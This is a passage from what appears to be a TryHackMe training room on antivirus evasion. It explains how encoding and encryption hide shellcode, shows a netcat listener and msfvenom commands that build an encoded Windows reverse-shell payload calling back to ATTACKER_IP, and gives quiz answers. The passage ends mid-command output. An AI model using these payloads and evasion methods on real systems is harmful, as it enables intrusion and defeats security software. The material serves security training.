<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lvp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">7474</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Do staged payloads deliver the full content of our payload in a single package? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Is the Metasploit payload <code>windows/x64/meterpreter_reverse_https</code> a staged payload? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Is the stage0 of a staged payload in charge of downloading the final payload to be executed? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Follow the instructions to create a staged payload and upload it into the THM Antivirus Check at <code>http://MACHINE_IP/</code> </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-7-introduction-to-encoding-and-encryption">Task 7 Introduction to Encoding and Encryption<a href="#task-7-introduction-to-encoding-and-encryption" class="hash-link" aria-label="Direct link to Task 7 Introduction to Encoding and Encryption" title="Direct link to Task 7 Introduction to Encoding and Encryption" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-encoding">What is Encoding?<a href="#what-is-encoding" class="hash-link" aria-label="Direct link to What is Encoding?" title="Direct link to What is Encoding?" translate="no">​</a></h3>
<p>Encoding is the process of changing the data from its original state into a specific format depending on the algorithm or type of encoding. It can be applied to many data types such as videos, HTML, URLs, and binary files (EXE, Images, etc.).</p>
<p>Encoding is an important concept that is commonly used for various purposes, including but not limited to:</p>
<ul>
<li class="">Program compiling and execution</li>
<li class="">Data storage and transmission</li>
<li class="">Data processing such as file conversion</li>
</ul>
<p>Similarly, when it comes to AV evasion techniques, encoding is also used to hide shellcode strings within a binary. However, encoding is not enough for evasion purposes. Nowadays, AV software is more intelligent and can analyze a binary, and once an encoded string is found, it is decoded to check the text&#x27;s original form.</p>
<p>You can also use two or more encoding algorithms in tandem to make it harder for the AV to figure out the hidden content. The following figure shows that we converted the &quot;THM&quot; string into hexadecimal representation and then encoded it using Base64. In this case, you need to make sure that your dropper now handles such encoding to restore the string to its original state.</p>
<p><img decoding="async" loading="lazy" alt="Double Text Encoding Technique" src="data:image/png;base64,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" width="409" height="220" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-encryption">What is Encryption?<a href="#what-is-encryption" class="hash-link" aria-label="Direct link to What is Encryption?" title="Direct link to What is Encryption?" translate="no">​</a></h3>
<p>Encryption is one of the essential elements of information and data security which focuses on preventing unauthorized access and manipulation of data. The encryption process involves converting plaintext (unencrypted content) into an encrypted version called Ciphertext. The Ciphertext can&#x27;t be read or decrypted without knowing the algorithm used in encryption as well as the key.</p>
<p>Like encoding, encryption techniques are used for various purposes, such as storing and transmitting data securely, as well as end-to-end encryption. Encryption can be used in two ways: having a shared key between two parties or using public and private keys.</p>
<p>For more information about encryption, we encourage you to check <a href="https://tryhackme.com/room/encryptioncrypto101" target="_blank" rel="noopener noreferrer" class="">Encryption - Crypto 101</a> room.</p>
<p><img decoding="async" loading="lazy" alt="Encryption and Decryption Concepts!" src="/TryHackMe-CN/en/assets/images/image_20251134-113439-1c36b7cf5cde255908cadf075f4df411.png" width="878" height="476" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-do-we-need-to-know-about-encoding-and-encryption">Why do we Need to Know About Encoding and Encryption?<a href="#why-do-we-need-to-know-about-encoding-and-encryption" class="hash-link" aria-label="Direct link to Why do we Need to Know About Encoding and Encryption?" title="Direct link to Why do we Need to Know About Encoding and Encryption?" translate="no">​</a></h3>
<p>AV vendors implement their AV software to blocklist most public tools (such as Metasploit and others) using static or dynamic detection techniques. Therefore, without modifying the shellcode generated by these public tools, the detection rate for your dropper is high.</p>
<p>Encoding and encryption can be used in AV evasion techniques where we encode and/or encrypt shellcode used in a dropper to hide it from AV software during the runtime. Also, the two techniques can be used not only to hide the shellcode but also functions, variables, etc. In this room, we mainly focus on encrypting the shellcode to evade Windows Defender.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Is encoding shellcode only enough to evade Antivirus software? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Do encoding techniques use a key to encode strings or files? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Do encryption algorithms use a key to encrypt strings or files? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-8-shellcode-encoding-and-encryption">Task 8 Shellcode Encoding and Encryption<a href="#task-8-shellcode-encoding-and-encryption" class="hash-link" aria-label="Direct link to Task 8 Shellcode Encoding and Encryption" title="Direct link to Task 8 Shellcode Encoding and Encryption" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="encode-using-msfvenom">Encode using MSFVenom<a href="#encode-using-msfvenom" class="hash-link" aria-label="Direct link to Encode using MSFVenom" title="Direct link to Encode using MSFVenom" translate="no">​</a></h3>
<p>Public Tools such as Metasploit provide encoding and encryption features. However, AV vendors are aware of the way these tools build their payloads and take measures to detect them. If you try using such features out of the box, chances are your payload will be detected as soon as the file touches the victim&#x27;s disk.</p>
<p>Let&#x27;s generate a simple payload with this method to prove that point. First of all, you can list all of the encoders available to msfvenom with the following command:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing Encoders within the Metasploit Framework</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">--list</span><span class="token plain"> encoders </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> excellent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br></span></code></pre></div></div>
<p>We can indicate we want to use the <code>shikata_ga_nai</code> encoder with the <code>-e</code> (encoder) switch and then specify we want to encode the payload three times with the <code>-i</code> (iterations) switch:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Encoding using the Metasploit Framework (Shikata_ga_nai)</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> x86 </span><span class="token parameter variable" style="color:#36acaa">--platform</span><span class="token plain"> Windows </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">443</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/shell_reverse_tcp </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> x86/shikata_ga_nai </span><span class="token parameter variable" style="color:#36acaa">-b</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\x00&#x27;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> csharp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Found </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> compatible encoders</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Attempting to encode payload with </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> iterations of x86/shikata_ga_nai</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai succeeded with size </span><span class="token number" style="color:#36acaa">368</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">iteration</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai succeeded with size </span><span class="token number" style="color:#36acaa">395</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">iteration</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai succeeded with size </span><span class="token number" style="color:#36acaa">422</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">iteration</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai chosen with final size </span><span class="token number" style="color:#36acaa">422</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: </span><span class="token number" style="color:#36acaa">422</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of csharp file: </span><span class="token number" style="color:#36acaa">2170</span><span class="token plain"> bytes</span><br></span></code></pre></div></div>
<p>If we try uploading our newly generated payload to our test machine, the AV will instantly flag it before we even get a chance to execute it:</p>
<p><img decoding="async" loading="lazy" alt="Windows Defender detected our payload as malicious!" src="/TryHackMe-CN/en/assets/images/image_20251150-205017-d3e301a62f4d6635ea60ab864325b7c5.png" width="811" height="439" class="img_ev3q"></p>
<p>If encoding doesn&#x27;t work, we can always try encrypting the payload. Intuitively, we would expect this to have a higher success rating, as decrypting the payload should prove a harder task for the AV. Let&#x27;s try that now.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="encryption-using-msfvenom">Encryption using MSFVenom<a href="#encryption-using-msfvenom" class="hash-link" aria-label="Direct link to Encryption using MSFVenom" title="Direct link to Encryption using MSFVenom" translate="no">​</a></h3>
<p>You can easily generate encrypted payloads using msfvenom. The choices for encryption algorithms are, however, a bit scarce. To list the available encryption algorithms, you can use the following command:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing encryption modules within the Metasploit Framework</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">--list</span><span class="token plain"> encrypt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Framework Encryption Formats </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">--encrypt </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">value</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token 